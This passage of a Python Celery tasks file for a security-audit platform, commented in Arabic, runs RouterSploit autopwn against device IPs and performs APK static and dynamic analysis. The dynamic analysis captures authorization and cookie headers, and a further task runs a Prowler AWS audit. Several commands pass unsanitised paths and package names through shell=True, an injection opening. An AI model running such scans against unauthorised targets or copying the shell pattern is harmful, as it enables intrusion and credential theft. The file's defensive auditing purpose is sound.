        child.sendline('use scanners/autopwn')
        child.expect(r'rsf \(autopwn\) >')
        
        # 3. قم بتعيين الهدف
        child.sendline(f'set target {device.ip_address}')
        child.expect(r'rsf \(autopwn\) >')
        
        # 4. قم بتشغيل الفحص (هذا قد يستغرق وقتًا طويلاً)
        child.sendline('run')
        # انتظر حتى ينتهي (قد يستغرق دقائق)، زد المهلة
        child.expect(r'rsf \(autopwn\) >', timeout=1800) # مهلة 30 دقيقة
        
        # 5. اخرج من العملية
        child.sendline('exit')
        child.close()
        log_file.close()

        # --- تحليل النتائج ---
        with open(log_file_path, 'r') as f:
            output = f.read()
        
        if "[+] Target is vulnerable" in output:
            Vulnerability.objects.create(
                scan=scan,
                description=f"RouterSploit found one or more vulnerabilities on {device.ip_address}",
                severity="High",
                details={'full_log': output}
            )
        
        scan.status = 'COMPLETED'
        result_message = "RouterSploit audit completed."

    except Exception as e:
        scan.status = 'FAILED'
        result_message = f"RouterSploit audit failed: {e}"
    
    finally:
        scan.completed_at = timezone.now()
        scan.save()
        if os.path.exists(log_file_path):
            os.remove(log_file_path)
            
    return result_message


# --- إضافة جديدة: مهمة تحليل APK ---
@shared_task
def analyze_apk_task(analysis_id):
    try:
        # نحن نستورد النماذج هنا لتجنب مشاكل الاستيراد الدائري
        from apk_analyzer.models import APKAnalysis, APKFinding
        analysis = APKAnalysis.objects.get(id=analysis_id)
    except APKAnalysis.DoesNotExist:
        return f"APKAnalysis with id {analysis_id} not found."

    analysis.status = 'ANALYZING'
    analysis.save()

    apk_path = analysis.apk_file.path
    output_dir = f"/tmp/apk_analysis_{analysis.id}"
    
    try:
        # --- المرحلة 1: تفكيك الـ APK باستخدام apktool ---
        apktool_cmd = f"apktool d {apk_path} -o {output_dir} -f"
        subprocess.run(apktool_cmd, shell=True, check=True, timeout=300)
        
        # --- المرحلة 2: تحليل AndroidManifest.xml ---
        manifest_path = os.path.join(output_dir, 'AndroidManifest.xml')
        if os.path.exists(manifest_path):
            parse_android_manifest(analysis, manifest_path)
        
                # --- المرحلة 3: فحص الأسرار باستخدام Trufflehog ---
        trufflehog_tool = Tool.objects.get(name='Trufflehog')
        trufflehog_output = f"/tmp/trufflehog_report_{analysis.id}.jsonl"

        # 👈 تعديل: جلب المسار من قاعدة البيانات
        trufflehog_path = trufflehog_tool.executable_path or 'trufflehog' # Use 'trufflehog' as fallback if in PATH
        
        trufflehog_cmd = f"{trufflehog_path} filesystem {output_dir} --json --no-update > {trufflehog_output}"
        subprocess.run(trufflehog_cmd, shell=True, check=False)
        
        # تحليل نتائج Trufflehog
        parse_trufflehog_json_for_apk(analysis, trufflehog_output)
        
        analysis.status = 'COMPLETED'
        result_message = "APK analysis completed successfully."

    except Exception as e:
        analysis.status = 'FAILED'
        result_message = f"An error occurred during APK analysis: {str(e)}"
        print(result_message)
    
    finally:
        analysis.completed_at = timezone.now()
        analysis.save()
        # تنظيف المجلدات المؤقتة
        if os.path.isdir(output_dir):
            shutil.rmtree(output_dir)
        if os.path.exists(trufflehog_output):
            os.remove(trufflehog_output)

    return result_message

# --- دوال مساعدة لمهمة تحليل APK ---
def parse_android_manifest(analysis, manifest_path):
    from apk_analyzer.models import APKFinding
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = {'android': 'http://schemas.android.com/apk/res/android'}
    
    # استخراج اسم الحزمة والإصدار
    analysis.package_name = root.get('package')
    analysis.version_name = root.get('versionName', 'N/A')
    analysis.save()
    
    # البحث عن الأذونات الخطيرة
    for perm in root.findall('uses-permission'):
        perm_name = perm.get(f"{{{ns['android']}}}name")
        if perm_name and 'SEND_SMS' in perm_name:
            APKFinding.objects.create(analysis=analysis, type="Dangerous Permission", description=f"App can send SMS messages: {perm_name}", severity="HIGH")

    # البحث عن المكونات المكشوفة
    app = root.find('application')
    if app is not None:
        for comp_type in ['activity', 'service', 'receiver', 'provider']:
            for comp in app.findall(comp_type):
                if comp.get(f"{{{ns['android']}}}exported") == 'true':
                    comp_name = comp.get(f"{{{ns['android']}}}name")
                    APKFinding.objects.create(analysis=analysis, type="Exported Component", description=f"Component '{comp_name}' is exported and can be called by other apps.", severity="MEDIUM")

def parse_trufflehog_json_for_apk(analysis, file_path):
    from apk_analyzer.models import APKFinding
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return
    with open(file_path, 'r') as f:
        for line in f:
            if line.strip():
                data = json.loads(line)
                APKFinding.objects.create(analysis=analysis, type="Leaked Secret", description=f"Found a potential secret: {data.get('DetectorName')}", severity="CRITICAL", details=data)
                


@shared_task
def analyze_apk_finding_with_ai(finding_id):
    try:
        from apk_analyzer.models import APKFinding
        finding = APKFinding.objects.get(id=finding_id)
    except APKFinding.DoesNotExist:
        return f"APKFinding with id {finding_id} not found."

    try:
        # --- هذا هو التعديل ---
        # 1. تكوين المكتبة
        genai.configure(api_key=settings.GEMINI_API_KEY)
        
        # 2. إنشاء النموذج (استخدام أحدث اسم مستقر)
        model = genai.GenerativeModel('gemini-1.5-flash-latest')

        # 3. تحضير الـ Prompt (يبقى كما هو)
        prompt = f"""
        As an expert mobile security analyst, analyze the following Android APK finding.
        Provide a concise, structured report in Markdown format with clear, actionable advice for a developer.

        **Finding Information:**
        - **Type:** {finding.type}
        - **Description:** {finding.description}
        - **Severity:** {finding.severity}
        - **Technical Details (JSON):** {json.dumps(finding.details, indent=2)}

        **Your report must include these sections in Markdown:**
        1.  **### 🕵️‍♂️ What is this?** (Explain the finding in simple terms).
        2.  **### 💣 What is the risk?** (Describe the real-world impact).
        3.  **### 🛠️ How to fix it?** (Provide a clear, step-by-step solution).
        4.  **### 🔬 How to test the fix?** (Explain how to verify the fix).
        """
        
        # 4. توليد المحتوى
        response = model.generate_content(prompt)
        analysis_text = response.text

        finding.ai_analysis = analysis_text
        finding.save()
        return f"Successfully analyzed APK finding #{finding.id}."

    except Exception as e:
        # تحسين رسالة الخطأ لتكون أكثر وضوحًا
        error_message = f"Gemini API Error: {str(e)}"
        print(error_message) # طباعة الخطأ في سجل Celery
        finding.ai_analysis = error_message
        finding.save()
        return error_message

# --- إضافة جديدة: مهمة التحليل الديناميكي للتطبيقات ---
@shared_task
def run_dynamic_analysis_task(analysis_id):
    from apk_analyzer.models import APKAnalysis, APKFinding
    import subprocess, os, json, shutil
    from django.utils import timezone

    try:
        analysis = APKAnalysis.objects.get(id=analysis_id)
    except APKAnalysis.DoesNotExist:
        return f"APKAnalysis with id {analysis_id} not found."

    analysis.status = 'ANALYZING'
    analysis.save()

    apk_path = analysis.apk_file.path
    log_file = f"/tmp/waydroid_capture_{analysis.id}.mitm"

    try:
        # 1️⃣ تشغيل Waydroid + تثبيت التطبيق
        subprocess.run(f"adb install -r {apk_path}", shell=True, check=True)

        # 2️⃣ تشغيل التطبيق
        try:
            # المحاولة الأولى: monkey
            subprocess.run(
                f"adb shell monkey -p {analysis.package_name} -c android.intent.category.LAUNCHER 1",
                shell=True, check=True
            )
        except subprocess.CalledProcessError:
            # fallback: am start مع Activity من قاعدة البيانات
            if analysis.fallback_activity:
                subprocess.run(
                    f"adb shell am start -n {analysis.package_name}/{analysis.fallback_activity}",
                    shell=True, check=True
                )
            else:
                raise Exception("No fallback activity specified in APKAnalysis")

        # 3️⃣ تسجيل الترافيك عبر mitmproxy (يفترض أنه شغال مسبقًا)
        # هنا نفترض أن mitmproxy يسجل تلقائيًا في log_file

        # 4️⃣ تحليل ملف mitmproxy
        if os.path.exists(log_file):
            from mitmproxy.io import FlowReader
            with open(log_file, "rb") as f:
                reader = FlowReader(f)
                for flow in reader.stream():
                    req = flow.request
                    resp = flow.response

                    url = req.pretty_url
                    method = req.method
                    headers = dict(req.headers)
                    body = req.get_text() if req.content else None

                    # نلتقط فقط الهيدرز الحساسة
                    sensitive_headers = {
                        k: v for k, v in headers.items()
                        if k.lower() in ["authorization", "cookie", "token"]
                    }

                    details = {
                        "method": method,
                        "url": url,
                        "headers": sensitive_headers,
                        "body": body[:500] if body else None,
                        "status_code": resp.status_code if resp else None,
                        "response_snippet": resp.get_text()[:500] if resp and resp.content else None
                    }

                    # نخزن كل طلب كـ Finding
                    APKFinding.objects.create(
                        analysis=analysis,
                        type="Dynamic HTTP Request",
                        description=f"{method} {url} (Status: {details['status_code']})",
                        severity="INFO",
                        details=details
                    )

        analysis.status = 'COMPLETED'
        result_message = "Dynamic analysis completed successfully."

    except Exception as e:
        analysis.status = 'FAILED'
        result_message = f"Dynamic analysis failed: {str(e)}"

    finally:
        analysis.completed_at = timezone.now()
        analysis.save()
        if os.path.exists(log_file):
            os.remove(log_file)

    return result_message


@shared_task
def run_prowler_audit_task(scan_id):
    try:
        scan = CloudScan.objects.get(id=scan_id)
        env = scan.environment
    except (CloudScan.DoesNotExist, AWSEnvironment.DoesNotExist):
        return "Scan or Environment not found."

    scan.status = 'ANALYZING'
    scan.save()

    # إعداد متغيرات البيئة لمفاتيح AWS
    prowler_env = os.environ.copy()
    prowler_env['AWS_ACCESS_KEY_ID'] = env.access_key_id
    prowler_env['AWS_SECRET_ACCESS_KEY'] = env.secret_access_key
    prowler_env['AWS_DEFAULT_REGION'] = env.default_region

    output_file = f"/tmp/prowler_report_{scan.id}.json"

    # 👈 تعديل: جلب المسار من قاعدة البيانات
    prowler_tool = Tool.objects.get(name='Prowler') # Assuming you have a tool named 'Prowler'
    prowler_path = prowler_tool.executable_path or 'prowler'
    
    command = [prowler_path, 'aws', '--output-mode', 'json']

    try:
        # Prowler يطبع النتائج إلى stdout، لذلك سنلتقطها
        with open(output_file, 'w') as f:
            result = subprocess.run(
                command,
                env=prowler_env,
                stdout=f, # توجيه المخرجات مباشرة إلى ملف
                stderr=subprocess.PIPE,
                text=True,
                timeout=3600 # مهلة ساعة
            )
        
        if result.returncode != 0:
            raise Exception(f"Prowler failed with stderr: {result.stderr}")

        # تحليل النتائج
        parse_prowler_json(scan, output_file)

        scan.status = 'COMPLETED'
        result_message = "Prowler audit completed successfully."
    except Exception as e:
        scan.status = 'FAILED'
        result_message = f"Prowler audit failed: {e}"
    
    finally:
        scan.completed_at = timezone.now()
        scan.save()
        if os.path.exists(output_file):
            os.remove(output_file)
    
    return result_message

def parse_prowler_json(scan, file_path):
    # Prowler يخرج JSON object لكل نتيجة في سطر منفصل (JSONL)
    with open(file_path, 'r') as f:
        for line in f:
            try:
                data = json.loads(line)
                if data.get('Status') == 'FAIL':
                    CloudFinding.objects.create(
                        scan=scan,
                        status=data.get('Status'),
                        severity=data.get('Severity'),
                        service_name=data.get('ServiceName'),
                        region=data.get('Region'),
                        resource_id=data.get('ResourceId'),
                        description=data.get('StatusExtended'),
                        remediation=data.get('Remediation', {}).get('Recommendation', {}).get('Text'),
                        details=data
                    )
            except json.JSONDecodeError:
                continue